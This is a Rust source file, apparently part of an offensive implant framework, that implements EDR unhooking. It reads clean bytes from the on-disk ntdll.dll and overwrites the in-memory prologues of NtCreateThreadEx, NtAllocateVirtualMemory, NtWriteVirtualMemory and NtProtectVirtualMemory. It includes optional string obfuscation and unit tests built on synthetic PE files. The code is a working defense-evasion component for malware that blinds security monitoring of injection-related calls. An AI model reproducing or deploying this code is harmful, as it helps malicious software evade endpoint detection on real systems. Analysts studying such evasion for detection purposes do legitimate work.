//! API unhooking by reading clean function bytes from the on-disk ntdll
//! (BOAZ api_untangle port).
//!
//! For each target function (default: `NtCreateThreadEx`,
//! `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`,
//! `NtProtectVirtualMemory`), the first 8 bytes are read from the mapped
//! disk image and written over the in-memory (potentially hooked) copy.

use core::ffi::c_void;

use crate::types::PAGE_EXECUTE_READWRITE;
use malefic_os_win::kit::binding::{
    MGetCurrentProcess, MGetProcAddress, MLoadLibraryA, MNtFlushInstructionCache, MVirtualProtect,
};

/// Number of bytes to restore at the start of each function (enough to cover
/// a typical 5-byte JMP hook or 8-byte syscall stub).
const PATCH_SIZE: usize = 8;

/// Path to the on-disk copy of ntdll (always present on Windows).
#[cfg(not(feature = "obf_strings"))]
const NTDLL_DISK_PATH: &str = r"C:\Windows\System32\ntdll.dll";

#[cfg(feature = "obf_strings")]
fn ntdll_disk_path() -> String {
    let p = obf_cstr!(b"C:\\Windows\\System32\\ntdll.dll\0");
    String::from_utf8_lossy(&p[..p.len() - 1]).into_owned()
}

/// Functions to unhook by default.
const DEFAULT_TARGETS: &[&str] = &[
    "NtCreateThreadEx",
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtProtectVirtualMemory",
];

// ─── PE helpers ───────────────────────────────────────────────────────────────

/// Find a function's raw file offset in a PE image loaded into `bytes`.
fn rva_to_raw(bytes: &[u8], rva: u32) -> Option<usize> {
    let e_lfanew = u32::from_le_bytes(bytes[0x3C..0x40].try_into().ok()?) as usize;
    let nt = e_lfanew;
    let num_sec = u16::from_le_bytes(bytes[nt + 6..nt + 8].try_into().ok()?) as usize;
    let opt_size = u16::from_le_bytes(bytes[nt + 20..nt + 22].try_into().ok()?) as usize;
    let sec_off = nt + 24 + opt_size;

    for i in 0..num_sec {
        let s = sec_off + i * 40;
        let virt_addr = u32::from_le_bytes(bytes[s + 12..s + 16].try_into().ok()?);
        let virt_size = u32::from_le_bytes(bytes[s + 16..s + 20].try_into().ok()?);
        let raw_off = u32::from_le_bytes(bytes[s + 20..s + 24].try_into().ok()?) as usize;

        if rva >= virt_addr && rva < virt_addr + virt_size {
            return Some(raw_off + (rva - virt_addr) as usize);
        }
    }
    None
}

/// Resolve `func_name` to its RVA using the export directory in `bytes`.
fn find_export_rva(bytes: &[u8], func_name: &str) -> Option<u32> {
    let e_lfanew = u32::from_le_bytes(bytes[0x3C..0x40].try_into().ok()?) as usize;
    let nt = e_lfanew;
    // DataDirectory[0] (exports) at opt_hdr + 0x70 (PE32+) or + 0x60 (PE32)
    // Magic at nt + 24
    let magic = u16::from_le_bytes(bytes[nt + 24..nt + 26].try_into().ok()?);
    let exp_rva_off = if magic == 0x20B {
        nt + 24 + 0x70
    } else {
        nt + 24 + 0x60
    };
    let exp_rva = u32::from_le_bytes(bytes[exp_rva_off..exp_rva_off + 4].try_into().ok()?);
    if exp_rva == 0 {
        return None;
    }
    let exp_raw = rva_to_raw(bytes, exp_rva)? as usize;

    let num_names = u32::from_le_bytes(bytes[exp_raw + 24..exp_raw + 28].try_into().ok()?) as usize;
    let addr_table_rva =
        u32::from_le_bytes(bytes[exp_raw + 28..exp_raw + 32].try_into().ok()?) as usize;
    let name_table_rva =
        u32::from_le_bytes(bytes[exp_raw + 32..exp_raw + 36].try_into().ok()?) as usize;
    let ord_table_rva =
        u32::from_le_bytes(bytes[exp_raw + 36..exp_raw + 40].try_into().ok()?) as usize;

    let addr_raw = rva_to_raw(bytes, addr_table_rva as u32)? as usize;
    let name_raw = rva_to_raw(bytes, name_table_rva as u32)? as usize;
    let ord_raw = rva_to_raw(bytes, ord_table_rva as u32)? as usize;

    for i in 0..num_names {
        let name_rva = u32::from_le_bytes(
            bytes[name_raw + i * 4..name_raw + i * 4 + 4]
                .try_into()
                .ok()?,
        ) as usize;
        let name_off = rva_to_raw(bytes, name_rva as u32)? as usize;
        let end = bytes[name_off..].iter().position(|&b| b == 0).unwrap_or(0);
        let name_str = core::str::from_utf8(&bytes[name_off..name_off + end]).ok()?;

        if name_str == func_name {
            let ord = u16::from_le_bytes(
                bytes[ord_raw + i * 2..ord_raw + i * 2 + 2]
                    .try_into()
                    .ok()?,
            ) as usize;
            let fn_rva = u32::from_le_bytes(
                bytes[addr_raw + ord * 4..addr_raw + ord * 4 + 4]
                    .try_into()
                    .ok()?,
            );
            return Some(fn_rva);
        }
    }
    None
}

// ─── Main routine ─────────────────────────────────────────────────────────────

/// Restore the first `PATCH_SIZE` bytes of each function in `targets`
/// using the clean on-disk ntdll image.
pub fn execute_modifications_for(targets: &[&str]) {
    #[cfg(feature = "obf_strings")]
    let disk_path = ntdll_disk_path();
    #[cfg(not(feature = "obf_strings"))]
    let disk_path = NTDLL_DISK_PATH.to_string();

    let disk_bytes = match std::fs::read(&disk_path) {
        Ok(b) => b,
        Err(_) => return,
    };

    unsafe {
        let ntdll_mem = {
            let _obf_ntdll_dll = obf_cstr!(b"ntdll.dll\0");
            let h = MLoadLibraryA(_obf_ntdll_dll.as_ptr());
            if h.is_null() {
                return;
            }
            h as *mut u8
        };

        for &func_name in targets {
            // Get in-memory address via GetProcAddress
            let mem_addr = MGetProcAddress(
                ntdll_mem as *const c_void,
                func_name
                    .as_bytes()
                    .iter()
                    .chain(core::iter::once(&0u8))
                    .cloned()
                    .collect::<Vec<_>>()
                    .as_ptr(),
            );
            if mem_addr.is_null() {
                continue;
            }

            // Find the same function's bytes in the disk image
            let fn_rva = match find_export_rva(&disk_bytes, func_name) {
                Some(r) => r,
                None => continue,
            };
            let fn_raw = match rva_to_raw(&disk_bytes, fn_rva) {
                Some(r) => r,
                None => continue,
            };
            if fn_raw + PATCH_SIZE > disk_bytes.len() {
                continue;
            }
            let clean_bytes = &disk_bytes[fn_raw..fn_raw + PATCH_SIZE];

            // Overwrite in-memory bytes
            let target = mem_addr as *mut u8;
            let mut old_prot: u32 = 0;
            if MVirtualProtect(
                target as *mut c_void,
                PATCH_SIZE,
                PAGE_EXECUTE_READWRITE,
                &mut old_prot,
            ) {
                core::ptr::copy_nonoverlapping(clean_bytes.as_ptr(), target, PATCH_SIZE);
                MVirtualProtect(target as *mut c_void, PATCH_SIZE, old_prot, &mut old_prot);
                MNtFlushInstructionCache(MGetCurrentProcess(), target as *mut c_void, PATCH_SIZE);
            }
        }
    }
}

/// Restore the default set of monitored NT functions.
pub fn execute_modifications() {
    execute_modifications_for(DEFAULT_TARGETS);
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a minimal synthetic PE64 file with one .text section.
    /// Returns (pe_bytes, text_rva, text_raw_offset).
    fn build_minimal_pe64(text_vaddr: u32, text_vsize: u32, text_raw: u32) -> Vec<u8> {
        let e_lfanew: u32 = 0x40;
        let opt_hdr_size: u16 = 0xF0; // standard PE32+ optional header size
        let num_sections: u16 = 1;
        // Section table starts at e_lfanew + 4(sig) + 20(COFF) + opt_hdr_size
        let sec_table_off = e_lfanew as usize + 4 + 20 + opt_hdr_size as usize;
        // PE file needs to be large enough for section table + section content
        let file_size = std::cmp::max(
            sec_table_off + 40 + 64,
            text_raw as usize + text_vsize as usize,
        );
        let mut pe = vec![0u8; file_size];

        // DOS header
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3C..0x40].copy_from_slice(&e_lfanew.to_le_bytes());

        // PE signature
        let nt = e_lfanew as usize;
        pe[nt..nt + 4].copy_from_slice(&0x00004550u32.to_le_bytes());

        // COFF header
        pe[nt + 4..nt + 6].copy_from_slice(&0x8664u16.to_le_bytes()); // Machine = x86_64
        pe[nt + 6..nt + 8].copy_from_slice(&num_sections.to_le_bytes());
        pe[nt + 20..nt + 22].copy_from_slice(&opt_hdr_size.to_le_bytes());

        // Optional header
        let opt = nt + 24;
        pe[opt..opt + 2].copy_from_slice(&0x020Bu16.to_le_bytes()); // Magic = PE32+

        // Section table entry: .text
        let sec = sec_table_off;
        pe[sec..sec + 5].copy_from_slice(b".text");
        pe[sec + 8..sec + 12].copy_from_slice(&text_vsize.to_le_bytes()); // Misc.VirtualSize
        pe[sec + 12..sec + 16].copy_from_slice(&text_vaddr.to_le_bytes()); // VirtualAddress
        pe[sec + 16..sec + 20].copy_from_slice(&text_vsize.to_le_bytes()); // SizeOfRawData
        pe[sec + 20..sec + 24].copy_from_slice(&text_raw.to_le_bytes()); // PointerToRawData

        pe
    }

    #[test]
    fn test_rva_to_raw_basic() {
        // Section: VA=0x1000, VSize=0x200, RawOffset=0x400
        let pe = build_minimal_pe64(0x1000, 0x200, 0x400);
        // RVA 0x1000 should map to raw offset 0x400
        assert_eq!(rva_to_raw(&pe, 0x1000), Some(0x400));
        // RVA 0x1050 should map to raw offset 0x450
        assert_eq!(rva_to_raw(&pe, 0x1050), Some(0x450));
        // RVA 0x11FF should map to raw offset 0x5FF (last byte in section)
        assert_eq!(rva_to_raw(&pe, 0x11FF), Some(0x5FF));
    }

    #[test]
    fn test_rva_to_raw_out_of_range() {
        let pe = build_minimal_pe64(0x1000, 0x200, 0x400);
        // RVA 0x1200 is outside the section (VA=0x1000, VSize=0x200)
        assert_eq!(rva_to_raw(&pe, 0x1200), None);
        // RVA 0x0FFF is before the section
        assert_eq!(rva_to_raw(&pe, 0x0FFF), None);
        // RVA 0x0000 is before all sections
        assert_eq!(rva_to_raw(&pe, 0x0000), None);
    }

    #[test]
    fn test_rva_to_raw_invalid_pe() {
        // Too short — rva_to_raw indexes bytes[0x3C..0x40] which panics on short input.
        // The production code only ever receives full PE files, so this is expected.
        let result = std::panic::catch_unwind(|| rva_to_raw(&[0u8; 16], 0x1000));
        assert!(result.is_err(), "Should panic on truncated input");
    }

    #[test]
    fn test_rva_to_raw_empty_data() {
        let result = std::panic::catch_unwind(|| rva_to_raw(&[], 0x1000));
        assert!(result.is_err(), "Should panic on empty input");
    }

    /// Build a PE64 with a fake export table containing specified function names.
    fn build_pe64_with_exports(funcs: &[&str]) -> Vec<u8> {
        let e_lfanew: u32 = 0x40;
        let opt_hdr_size: u16 = 0xF0;
        let num_sections: u16 = 1;
        let sec_table_off = e_lfanew as usize + 4 + 20 + opt_hdr_size as usize;

        // Section layout:
        // .text section at VA=0x1000, raw at 0x400, large enough for exports
        let text_va: u32 = 0x1000;
        let text_raw: u32 = 0x400;

        // Export directory layout (all within the .text section):
        let exp_rva = text_va; // export dir at start of .text
        let exp_raw = text_raw as usize;

        let n = funcs.len();
        // Layout after export dir (40 bytes):
        //   addr_table: at exp + 40, n * 4 bytes
        //   name_table: at exp + 40 + n*4, n * 4 bytes
        //   ord_table:  at exp + 40 + n*8, n * 2 bytes
        //   names:      after ord table
        let addr_table_rva = exp_rva + 40;
        let name_table_rva = addr_table_rva + (n as u32) * 4;
        let ord_table_rva = name_table_rva + (n as u32) * 4;
        let names_start_rva = ord_table_rva + (n as u32) * 2;

        // Calculate total size needed
        let mut total_name_len = 0usize;
        for f in funcs {
            total_name_len += f.len() + 1;
        } // +1 for null terminator
        let section_size = 40 + n * 4 + n * 4 + n * 2 + total_name_len + 64;
        let file_size = text_raw as usize + section_size;
        let mut pe = vec![0u8; file_size];

        // DOS header
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3C..0x40].copy_from_slice(&e_lfanew.to_le_bytes());

        // PE signature + COFF
        let nt = e_lfanew as usize;
        pe[nt..nt + 4].copy_from_slice(&0x00004550u32.to_le_bytes());
        pe[nt + 4..nt + 6].copy_from_slice(&0x8664u16.to_le_bytes());
        pe[nt + 6..nt + 8].copy_from_slice(&num_sections.to_le_bytes());
        pe[nt + 20..nt + 22].copy_from_slice(&opt_hdr_size.to_le_bytes());

        // Optional header
        let opt = nt + 24;
        pe[opt..opt + 2].copy_from_slice(&0x020Bu16.to_le_bytes()); // PE32+
                                                                    // DataDirectory[0] (exports) at opt + 0x70
        pe[opt + 0x70..opt + 0x74].copy_from_slice(&exp_rva.to_le_bytes());
        pe[opt + 0x74..opt + 0x78].copy_from_slice(&(section_size as u32).to_le_bytes());

        // Section table
        let sec = sec_table_off;
        pe[sec..sec + 5].copy_from_slice(b".text");
        pe[sec + 8..sec + 12].copy_from_slice(&(section_size as u32).to_le_bytes());
        pe[sec + 12..sec + 16].copy_from_slice(&text_va.to_le_bytes());
        pe[sec + 16..sec + 20].copy_from_slice(&(section_size as u32).to_le_bytes());
        pe[sec + 20..sec + 24].copy_from_slice(&text_raw.to_le_bytes());

        // Export directory table (at exp_raw)
        let ed = exp_raw;
        pe[ed + 20..ed + 24].copy_from_slice(&1u32.to_le_bytes()); // NumberOfFunctions
        pe[ed + 24..ed + 28].copy_from_slice(&(n as u32).to_le_bytes()); // NumberOfNames
        pe[ed + 28..ed + 32].copy_from_slice(&addr_table_rva.to_le_bytes());
        pe[ed + 32..ed + 36].copy_from_slice(&name_table_rva.to_le_bytes());
        pe[ed + 36..ed + 40].copy_from_slice(&ord_table_rva.to_le_bytes());

        // Convert RVAs to raw offsets for writing
        let addr_raw = (addr_table_rva - text_va + text_raw) as usize;
        let name_raw = (name_table_rva - text_va + text_raw) as usize;
        let ord_raw = (ord_table_rva - text_va + text_raw) as usize;
        let mut name_off_rva = names_start_rva;

        for i in 0..n {
            // Address table: fake RVA for each function (0x2000 + i*0x10)
            let fn_rva = 0x2000u32 + (i as u32) * 0x10;
            pe[addr_raw + i * 4..addr_raw + i * 4 + 4].copy_from_slice(&fn_rva.to_le_bytes());
            // Ordinal table: ordinal = i
            pe[ord_raw + i * 2..ord_raw + i * 2 + 2].copy_from_slice(&(i as u16).to_le_bytes());
            // Name pointer table: RVA to name string
            pe[name_raw + i * 4..name_raw + i * 4 + 4].copy_from_slice(&name_off_rva.to_le_bytes());
            // Write name string
            let name_file_off = (name_off_rva - text_va + text_raw) as usize;
            let name_bytes = funcs[i].as_bytes();
            pe[name_file_off..name_file_off + name_bytes.len()].copy_from_slice(name_bytes);
            pe[name_file_off + name_bytes.len()] = 0; // null terminator
            name_off_rva += (name_bytes.len() + 1) as u32;
        }

        pe
    }

    #[test]
    fn test_find_export_rva_single_func() {
        let pe = build_pe64_with_exports(&["NtAllocateVirtualMemory"]);
        let rva = find_export_rva(&pe, "NtAllocateVirtualMemory");
        assert_eq!(rva, Some(0x2000));
    }

    #[test]
    fn test_find_export_rva_multiple_funcs() {
        let funcs = &[
            "NtAllocateVirtualMemory",
            "NtCreateThreadEx",
            "NtWriteVirtualMemory",
        ];
        let pe = build_pe64_with_exports(funcs);
        assert_eq!(
            find_export_rva(&pe, "NtAllocateVirtualMemory"),
            Some(0x2000)
        );
        assert_eq!(find_export_rva(&pe, "NtCreateThreadEx"), Some(0x2010));
        assert_eq!(find_export_rva(&pe, "NtWriteVirtualMemory"), Some(0x2020));
    }

    #[test]
    fn test_find_export_rva_not_found() {
        let pe = build_pe64_with_exports(&["NtAllocateVirtualMemory"]);
        assert_eq!(find_export_rva(&pe, "NtFreeVirtualMemory"), None);
    }

    #[test]
    fn test_find_export_rva_invalid_pe() {
        let result = std::panic::catch_unwind(|| find_export_rva(&[0u8; 16], "foo"));
        assert!(result.is_err(), "Should panic on truncated input");
        let result = std::panic::catch_unwind(|| find_export_rva(&[], "foo"));
        assert!(result.is_err(), "Should panic on empty input");
    }
}
